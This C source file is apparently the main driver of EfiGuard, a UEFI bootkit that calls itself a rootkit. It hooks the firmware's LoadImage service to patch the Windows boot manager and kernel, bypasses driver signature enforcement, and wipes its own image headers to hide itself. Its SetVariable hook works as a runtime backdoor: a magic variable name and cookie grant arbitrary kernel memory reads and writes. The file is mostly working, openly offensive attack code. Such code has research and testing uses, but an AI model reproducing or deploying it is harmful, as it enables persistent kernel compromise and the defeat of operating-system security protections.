#include "EfiGuardDxe.h"

#include <Protocol/Shell.h>
#include <Guid/EventGroup.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DevicePathLib.h>
#include <Library/SynchronizationLib.h>

//
// EFI Driver Version Protocol
//
EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL gEfiGuardSupportedEfiVersion =
{
	sizeof(EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL),
	EFI_2_10_SYSTEM_TABLE_REVISION
};

//
// Driver unload
//
EFI_STATUS
EFIAPI
EfiGuardUnload(
	IN EFI_HANDLE ImageHandle
	);

//
// EfiGuard driver protocol
//
EFI_STATUS
EFIAPI
DriverConfigure(
	IN EFIGUARD_CONFIGURATION_DATA* ConfigurationData
	);

EFIGUARD_DRIVER_PROTOCOL gEfiGuardDriverProtocol =
{
	DriverConfigure
};

//
// Default driver configuration used if Configure() is not called
//
EFIGUARD_CONFIGURATION_DATA gDriverConfig = {
	DSE_DISABLE_SETVARIABLE_HOOK,	// DseBypassMethod
	FALSE							// WaitForKeyPress
};

//
// Bootmgfw.efi handle
//
EFI_HANDLE gBootmgfwHandle = NULL;

//
// EFI runtime globals
//
EFI_EVENT gEfiExitBootServicesEvent = NULL;
BOOLEAN gEfiAtRuntime = FALSE;
EFI_EVENT gEfiVirtualNotifyEvent = NULL;
BOOLEAN gEfiGoneVirtual = FALSE;

//
// Original gBS->LoadImage pointer
//
STATIC EFI_IMAGE_LOAD mOriginalLoadImage = NULL;

//
// Original gRT->SetVariable pointer
//
STATIC EFI_SET_VARIABLE mOriginalSetVariable = NULL;

#if defined(MDE_CPU_X64)
#define MM_SYSTEM_RANGE_START	(VOID*)(0xFFFF080000000000) // Windows XP through 7 value. On newer systems this is a bit higher, but not that much
#elif defined(MDE_CPU_IA32)
#define MM_SYSTEM_RANGE_START	(VOID*)(0x80000000)
#endif

// Title (adapted from original by Dude719)
#define EFIGUARD_TITLE1		L"\r\n ██╗     ██╗            ██╗      ██╗   ██╗ " \
							L"\r\n ████╗ ████║  ██████╗████████╗████████╗╚═╝ " \
							L"\r\n ██║ ██╔═██║██╔════██╗  ██╔══╝   ██╔══╝██╗ " \
							L"\r\n ██║ ╚═╝ ██║██║    ██║  ██║      ██║   ██║ " 
#define EFIGUARD_TITLE2		L"\r\n ██║     ██║ ╚███████║  █████╗   █████╗██║ " \
							L"\r\n ╚═╝     ╚═╝  ╚══════╝  ╚════╝   ╚════╝╚═╝ " \
							L"\r\n                                           " \
							L"\r\n        Rootkits You Can Trust (TM)        \r\n"


//
// (Un)hooks a service table pointer, replacing its value with NewFunction and returning the original address.
//
VOID*
SetServicePointer(
	IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
	IN OUT VOID **ServiceTableFunction,
	IN VOID *NewFunction
	)
{
	if (ServiceTableFunction == NULL || NewFunction == NULL)
		return NULL;

	// If this is really needed after boot time at some point the CRC function is easy enough to reimplement
	ASSERT(gBS != NULL);
	ASSERT(gBS->CalculateCrc32 != NULL);

	CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL); // Note: implies cli

	VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction,
																*ServiceTableFunction,
																NewFunction);

	// Recalculate the table checksum
	ServiceTableHeader->CRC32 = 0;
	gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);

	gBS->RestoreTPL(Tpl);

	return OriginalFunction;
}

//
// Boot Services LoadImage hook
//
EFI_STATUS
EFIAPI
HookedLoadImage(
	IN BOOLEAN BootPolicy,
	IN EFI_HANDLE ParentImageHandle,
	IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
	IN VOID *SourceBuffer OPTIONAL,
	IN UINTN SourceSize,
	OUT EFI_HANDLE *ImageHandle
	)
{
	// Try to get a readable file path from the EFI shell protocol if it's available
	EFI_SHELL_PROTOCOL* EfiShellProtocol = NULL;
	CONST EFI_STATUS EfiShellStatus = gBS->LocateProtocol(&gEfiShellProtocolGuid,
															NULL,
															(VOID**)&EfiShellProtocol);
	CHAR16* ImagePath = NULL;
	if (!EFI_ERROR(EfiShellStatus))
	{
		ImagePath = EfiShellProtocol->GetFilePathFromDevicePath(DevicePath);
	}
	if (ImagePath == NULL)
	{
		ImagePath = ConvertDevicePathToText(DevicePath, TRUE, TRUE);
	}

	// We only have a filename to go on at this point. We will determine the final 'is this bootmgfw.efi?' status after the image has been loaded
	CONST BOOLEAN MaybeBootmgfw = ImagePath != NULL
		? (StrStr(ImagePath, L"bootmgfw.efi") != NULL || StrStr(ImagePath, L"BOOTMGFW.EFI") != NULL ||
			StrStr(ImagePath, L"bootx64.efi") != NULL || StrStr(ImagePath, L"BOOTX64.EFI") != NULL)
		: FALSE;
	CONST BOOLEAN IsBoot = (MaybeBootmgfw || (BootPolicy == TRUE && SourceBuffer == NULL));

	// Print what's being loaded or booted
	CONST INT32 OriginalAttribute = SetConsoleTextColour(EFI_GREEN, FALSE);
	Print(L"[HookedLoadImage] %S %S\r\n    (ParentImageHandle = %llx)\r\n",
		(IsBoot ? L"Booting" : L"Loading"), ImagePath, (UINTN)ParentImageHandle);
	if (ImagePath != NULL)
		FreePool(ImagePath);
	RtlSleep(500);

	// Q: If we loaded bootmgfw.efi manually, is there any benefit to flipping BootPolicy to TRUE
	// to make it look like the load request came straight from the boot manager?
	if (MaybeBootmgfw)
	{
		// Let's find out
		BootPolicy = TRUE;
	}

	// Load the image
	CONST EFI_STATUS Status = mOriginalLoadImage(BootPolicy,
												ParentImageHandle,
												DevicePath,
												SourceBuffer,
												SourceSize,
												ImageHandle);

	// Was this a successful load of an image that's being booted?
	if (!EFI_ERROR(Status) && IsBoot && *ImageHandle != NULL)
	{
		// Get loaded image info
		EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
		CONST EFI_STATUS ImageInfoStatus = gBS->OpenProtocol(*ImageHandle,
															&gEfiLoadedImageProtocolGuid,
															(VOID**)&LoadedImage,
															gImageHandle,
															NULL,
															EFI_OPEN_PROTOCOL_GET_PROTOCOL);
		if (EFI_ERROR(ImageInfoStatus))
		{
			Print(L"\r\nHookedLoadImage: failed to get loaded image info. Status: %llx (%r)\r\n",
				ImageInfoStatus, ImageInfoStatus);
		}
		else
		{
			// Determine the type of file we're loading
			CONST INPUT_FILETYPE FileType = GetInputFileType((UINT8*)LoadedImage->ImageBase, LoadedImage->ImageSize);
			ASSERT(FileType == Unknown || FileType == Bootmgr || FileType == BootmgfwEfi);

			if (FileType == BootmgfwEfi)
			{
				// This is bootmgfw.efi. Save the returned image handle
				gBootmgfwHandle = *ImageHandle;
				LoadedImage->ParentHandle = NULL;

				// Print image info
				PrintLoadedImageInfo(LoadedImage);

				// Nuke it dot it
				PatchBootManager(FileType,
								LoadedImage->ImageBase,
								LoadedImage->ImageSize);
			}
			else
			{
				// A non-Windows OS is being booted. Unload ourselves
				EfiGuardUnload(gImageHandle);
			}
		}
	}

	gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);
	gST->ConOut->EnableCursor(gST->ConOut, FALSE);

	return Status;
}

//
// Runtime Services SetVariable hook
//
EFI_STATUS
EFIAPI
HookedSetVariable(
	IN CHAR16 *VariableName,
	IN EFI_GUID *VendorGuid,
	IN UINT32 Attributes,
	IN UINTN DataSize,
	IN VOID *Data
	)
{
	// We should not be hooking the runtime table after ExitBootServices() unless this is the selected DSE bypass method
	ASSERT(!gEfiAtRuntime || gDriverConfig.DseBypassMethod == DSE_DISABLE_SETVARIABLE_HOOK);

	// Do we have a match for the variable name and vendor GUID?
	if (gEfiAtRuntime && gEfiGoneVirtual &&
		VariableName != NULL && VariableName[0] != CHAR_NULL && VendorGuid != NULL &&
		CompareGuid(VendorGuid, EFIGUARD_BACKDOOR_VARIABLE_GUID) &&
		StrnCmp(VariableName, EFIGUARD_BACKDOOR_VARIABLE_NAME, (sizeof(EFIGUARD_BACKDOOR_VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0)
	{
		// Yep. Do we have any data?
		if (DataSize == 0 && Data == NULL)
		{
			// Nope. This is the first SetVariable() call from the HAL, intended to wipe the variable.
			// (This call may be skipped if EFI_VARIABLE_APPEND_WRITE is set, but this is version-dependent)
			return EFI_SUCCESS;
		}

		if ((Attributes & EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES) == EFIGUARD_BACKDOOR_VARIABLE_ATTRIBUTES &&
			DataSize == EFIGUARD_BACKDOOR_VARIABLE_DATASIZE &&
			Data != NULL)
		{
			// Yep, and Attributes and DataSize are correct. Check if *Data is a valid input for a backdoor read/write operation
			EFIGUARD_BACKDOOR_DATA* BackdoorData = (EFIGUARD_BACKDOOR_DATA*)Data;
			if (BackdoorData->CookieValue == EFIGUARD_BACKDOOR_COOKIE_VALUE &&
				BackdoorData->Size > 0 &&
				(UINTN)BackdoorData->KernelAddress >= (UINTN)MM_SYSTEM_RANGE_START)
			{
				if (BackdoorData->IsMemCopy && BackdoorData->u.UserBuffer != NULL)
				{
					if (BackdoorData->IsReadOperation) // Copy kernel buffer to user address
						CopyMem(BackdoorData->u.UserBuffer, BackdoorData->KernelAddress, BackdoorData->Size);
					else // Copy user buffer to kernel address
						CopyMem(BackdoorData->KernelAddress, BackdoorData->u.UserBuffer, BackdoorData->Size);
				}
				else
				{
					// Copy user scalar to kernel memory, and put the old value in BackdoorData->u.XXX
					switch (BackdoorData->Size)
					{
						case 1:
						{
							CONST UINT8 NewByte = (UINT8)BackdoorData->u.s.Byte;
							BackdoorData->u.s.Byte = *(UINT8*)BackdoorData->KernelAddress;
							if (!BackdoorData->IsReadOperation)
								*(UINT8*)BackdoorData->KernelAddress = NewByte;
							break;
						}
						case 2:
						{
							CONST UINT16 NewWord = (UINT16)BackdoorData->u.s.Word;
							BackdoorData->u.s.Word = *(UINT16*)BackdoorData->KernelAddress;
							if (!BackdoorData->IsReadOperation)
								*(UINT16*)BackdoorData->KernelAddress = NewWord;
							break;
						}
						case 4:
						{
							CONST UINT32 NewDword = (UINT32)BackdoorData->u.s.Dword;
							BackdoorData->u.s.Dword = *(UINT32*)BackdoorData->KernelAddress;
							if (!BackdoorData->IsReadOperation)
								*(UINT32*)BackdoorData->KernelAddress = NewDword;
							break;
						}
						case 8:
						{
							CONST UINT64 NewQword = (UINT64)BackdoorData->u.Qword;
							BackdoorData->u.Qword = *(UINT64*)BackdoorData->KernelAddress;
							if (!BackdoorData->IsReadOperation)
								*(UINT64*)BackdoorData->KernelAddress = NewQword;
							break;
						}
						default:
							break; // Invalid size; do nothing
					}
				}

				// Backdoor complete
				return EFI_SUCCESS;
			}
			//else { /*Invalid EFIGUARD_BACKDOOR_DATA* provided*/ }
		}
		//else { /*Data is NULL, or DataSize/Attributes mismatch*/ }
	}
	//else { /*Not our variable name + vendor GUID, or SetVirtualAddressMap() has not been called yet*/ }

	return mOriginalSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

//
// ExitBootServices callback
//
VOID
EFIAPI
ExitBootServicesEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{
	// Close this event now. The boot loader only calls this once.
	gBS->CloseEvent(gEfiExitBootServicesEvent);
	gEfiExitBootServicesEvent = NULL;

	// The message buffer may be empty if the patch process was aborted in one of the earlier stages
	if (gKernelPatchInfo.Buffer[0] != CHAR_NULL)
	{
		CONST EFI_STATUS Status = gKernelPatchInfo.Status;
		CONST INT32 OriginalAttribute = gST->ConOut->Mode->Attribute;
		if (Status == EFI_SUCCESS)
		{
			SetConsoleTextColour(EFI_GREEN, TRUE);
			PrintKernelPatchInfo();
			Print(L"\r\nSuccessfully patched ntoskrnl.exe.\r\n");

			if (gDriverConfig.WaitForKeyPress)
			{
				Print(L"\r\nPress any key to continue.\r\n");
				WaitForKey();
			}
		}
		else
		{
			// Patch failed. Most important stuff first: make a fake BSOD, because... reasons
			// TODO if really bored: use GOP to set the BG colour on the whole screen.
			// Could add one of those obnoxious Win 10 :( smileys and a QR code
			gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE | EFI_BACKGROUND_BLUE);
			gST->ConOut->ClearScreen(gST->ConOut);

			Print(L"A problem has been detected and Windows has been paused to prevent damage\r\nto your botnets.\r\n\r\n"
				L"BOOTKIT_KERNEL_PATCH_FAILED\r\n\r\n"
				L"Technical information:\r\n\r\n*** STOP: 0X%llX (%r, 0x%p)\r\n\r\n",
				Status, Status, gKernelPatchInfo.KernelBase);
			PrintKernelPatchInfo();

			// Give time for user to register their loss and allow for the grieving process to set in
			RtlSleep(2000);

			// Prompt user to ask what they want to do
			Print(L"\r\nPress any key to continue anyway, or press ESC to reboot.\r\n");
			if (!WaitForKey())
			{
				gRT->ResetSystem(EfiResetCold, EFI_SUCCESS, 0, NULL);
			}
		}

		gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);
		if (Status != EFI_SUCCESS)
			gST->ConOut->ClearScreen(gST->ConOut);
	}

	// If the DSE bypass method is *not* DSE_DISABLE_SETVARIABLE_HOOK, perform some cleanup now. In principle this should allow
	// linking with /SUBSYSTEM:EFI_BOOT_SERVICE_DRIVER, because our driver image may be freed after this callback returns.
	// Using DSE_DISABLE_SETVARIABLE_HOOK requires linking with /SUBSYSTEM:EFI_RUNTIME_DRIVER, because the image must not be freed.
	if (gDriverConfig.DseBypassMethod != DSE_DISABLE_SETVARIABLE_HOOK)
	{
		// Uninstall our installed driver protocols
		gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
												&gEfiGuardDriverProtocolGuid,
												&gEfiGuardDriverProtocol,
												&gEfiDriverSupportedEfiVersionProtocolGuid,
												&gEfiGuardSupportedEfiVersion,
												NULL);

		// Unregister SetVirtualAddressMap() notification
		if (gEfiVirtualNotifyEvent != NULL)
		{
			gBS->CloseEvent(gEfiVirtualNotifyEvent);
			gEfiVirtualNotifyEvent = NULL;
		}

		// Unhook gRT->SetVariable
		if (mOriginalSetVariable != NULL)
		{
			SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID*)mOriginalSetVariable);
			mOriginalSetVariable = NULL;
		}
	}

	// Regardless of which OS is being booted, boot services won't be available after this callback returns
	gBS = NULL;
	mOriginalLoadImage = NULL;
	gEfiAtRuntime = TRUE;
}

//
// SetVirtualAddressMap callback
//
VOID
EFIAPI
SetVirtualAddressMapEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{
	ASSERT(gEfiAtRuntime == TRUE);
	ASSERT(gBS == NULL);
	gEfiVirtualNotifyEvent = NULL;

	// Convert the original SetVariable pointer to virtual so our hook will continue to work
	EFI_STATUS Status = gRT->ConvertPointer(0, (VOID**)&mOriginalSetVariable);
	ASSERT_EFI_ERROR(Status);

	// Convert the runtime services pointer itself from physical to virtual
	Status = gRT->ConvertPointer(0, (VOID**)&gRT);
	ASSERT_EFI_ERROR(Status);

	// Set the flag indicating virtual addressing mode has been entered
	gEfiGoneVirtual = TRUE;
}

EFI_STATUS
EFIAPI
DriverConfigure(
	IN EFIGUARD_CONFIGURATION_DATA* ConfigurationData
	)
{
	// Do not allow configure if we are at runtime, or if the Windows boot manager has been loaded
	if (gEfiAtRuntime || gBootmgfwHandle != NULL)
		return EFI_ACCESS_DENIED;

	if (ConfigurationData == NULL)
		return EFI_INVALID_PARAMETER;

	gDriverConfig = *ConfigurationData;

	Print(L"Configuration data accepted.\r\n\r\n");

	return EFI_SUCCESS;
}

//
// Driver unload
//
EFI_STATUS
EFIAPI
EfiGuardUnload(
	IN EFI_HANDLE ImageHandle
	)
{
	// Do not allow unload if we are at runtime, or if the Windows boot manager has been loaded
	if (gEfiAtRuntime || gBootmgfwHandle != NULL)
	{
		return EFI_ACCESS_DENIED;
	}

	ASSERT(gBS != NULL);

	// Uninstall our installed driver protocols
	gBS->UninstallMultipleProtocolInterfaces(gImageHandle,
											&gEfiGuardDriverProtocolGuid,
											&gEfiGuardDriverProtocol,
											&gEfiDriverSupportedEfiVersionProtocolGuid,
											&gEfiGuardSupportedEfiVersion,
											NULL);

	// Unregister SetVirtualAddressMap() notification
	if (gEfiVirtualNotifyEvent != NULL)
	{
		gBS->CloseEvent(gEfiVirtualNotifyEvent);
		gEfiVirtualNotifyEvent = NULL;
	}

	// Unregister ExitBootServices() notification
	if (gEfiExitBootServicesEvent != NULL)
	{
		gBS->CloseEvent(gEfiExitBootServicesEvent);
		gEfiExitBootServicesEvent = NULL;
	}

	// Unhook gRT->SetVariable
	if (mOriginalSetVariable != NULL)
	{
		SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID*)mOriginalSetVariable);
		mOriginalSetVariable = NULL;
	}

	// Unhook gBS->LoadImage
	if (mOriginalLoadImage != NULL)
	{
		SetServicePointer(&gBS->Hdr, (VOID**)&gBS->LoadImage, (VOID*)mOriginalLoadImage);
		mOriginalLoadImage = NULL;
	}

	return EFI_SUCCESS;
}

// 
// Main entry point
// 
EFI_STATUS
EFIAPI
EfiGuardInitialize(
	IN EFI_HANDLE ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
	)
{
	ASSERT(ImageHandle == gImageHandle);

	// Check if we're not already loaded.
	EFIGUARD_DRIVER_PROTOCOL* EfiGuardDriverProtocol;
	EFI_STATUS Status = gBS->LocateProtocol(&gEfiGuardDriverProtocolGuid,
											NULL,
											(VOID**)&EfiGuardDriverProtocol);
	if (Status != EFI_NOT_FOUND)
	{
		Print(L"An instance of the driver is already loaded.\r\n");
		return EFI_ALREADY_STARTED;
	}

	//
	// Install supported EFI version protocol
	//
	Status = gBS->InstallMultipleProtocolInterfaces(&gImageHandle,
													&gEfiDriverSupportedEfiVersionProtocolGuid,
													&gEfiGuardSupportedEfiVersion,
													NULL);
	if (EFI_ERROR(Status))
	{
		Print(L"Failed to install EFI Driver Supported Version protocol. Error: %llx (%r)\r\n", Status, Status);
		return Status;
	}

	//
	// Install EfiGuard driver protocol
	//
	Status = gBS->InstallProtocolInterface(&gImageHandle,
											&gEfiGuardDriverProtocolGuid,
											EFI_NATIVE_INTERFACE,
											&gEfiGuardDriverProtocol);
	if (EFI_ERROR(Status))
		goto Exit;

	//
	// Clear screen and print header
	//
	CONST INT32 OriginalAttribute = SetConsoleTextColour(EFI_GREEN, TRUE);
	Print(L"\r\n\r\n");
	Print(L"%S", EFIGUARD_TITLE1);
	Print(L"%S", EFIGUARD_TITLE2);
	gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);

	EFI_LOADED_IMAGE_PROTOCOL *LocalImageInfo;
	Status = gBS->OpenProtocol(gImageHandle,
								&gEfiLoadedImageProtocolGuid,
								(VOID**)&LocalImageInfo,
								gImageHandle,
								NULL,
								EFI_OPEN_PROTOCOL_GET_PROTOCOL);
	if (EFI_ERROR(Status))
		goto Exit;

	PrintLoadedImageInfo(LocalImageInfo);

	//
	// Hook gBS->LoadImage
	//
	mOriginalLoadImage = (EFI_IMAGE_LOAD)SetServicePointer(&gBS->Hdr, (VOID**)&gBS->LoadImage, (VOID*)&HookedLoadImage);
	Print(L"Hooked gBS->LoadImage: 0x%p -> 0x%p\r\n", (VOID*)mOriginalLoadImage, (VOID*)&HookedLoadImage);

	//
	// Hook gRT->SetVariable
	//
	mOriginalSetVariable = (EFI_SET_VARIABLE)SetServicePointer(&gRT->Hdr, (VOID**)&gRT->SetVariable, (VOID**)&HookedSetVariable);
	Print(L"Hooked gRT->SetVariable: 0x%p -> 0x%p\r\n", (VOID*)mOriginalSetVariable, (VOID*)&HookedSetVariable);

	// Register notification callback for ExitBootServices()
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								ExitBootServicesEvent,
								NULL,
								&gEfiEventExitBootServicesGuid,
								&gEfiExitBootServicesEvent);
	if (EFI_ERROR(Status))
		goto Exit;

	// Register notification callback for SetVirtualAddressMap()
	Status = gBS->CreateEventEx(EVT_NOTIFY_SIGNAL,
								TPL_NOTIFY,
								SetVirtualAddressMapEvent,
								NULL,
								&gEfiEventVirtualAddressChangeGuid,
								&gEfiVirtualNotifyEvent);
	if (EFI_ERROR(Status))
		goto Exit;

	// Initialize the global kernel patch info struct.
	gKernelPatchInfo.Status = EFI_SUCCESS;
	gKernelPatchInfo.BufferSize = 0;
	SetMem64(gKernelPatchInfo.Buffer, sizeof(gKernelPatchInfo.Buffer), 0ULL);
	gKernelPatchInfo.LegacyLoaderBlock = FALSE;
	gKernelPatchInfo.KernelBase = NULL;

	// Wipe our image info and PE headers
	LocalImageInfo->DeviceHandle = LocalImageInfo->FilePath = LocalImageInfo->ParentHandle = NULL;
	CONST PEFI_IMAGE_NT_HEADERS NtHeaders = RtlpImageNtHeaderEx(LocalImageInfo->ImageBase, LocalImageInfo->ImageSize);
	ZeroMem(LocalImageInfo->ImageBase, NtHeaders->OptionalHeader.SizeOfHeaders);

	// The ASCII banner is very pretty - ensure the user has enough time to admire it
	RtlSleep(1500);

Exit:
	if (EFI_ERROR(Status))
	{
		Print(L"\r\nEfiGuardDxe initialization failed with status %llx (%r)\r\n", Status, Status);

		// Because we do not use the driver binding protocol, recovering from a failed load is simple.
		// We can just call the unload function, which will only unload that which was actually installed.
		EfiGuardUnload(gImageHandle);
	}
	return Status;
}
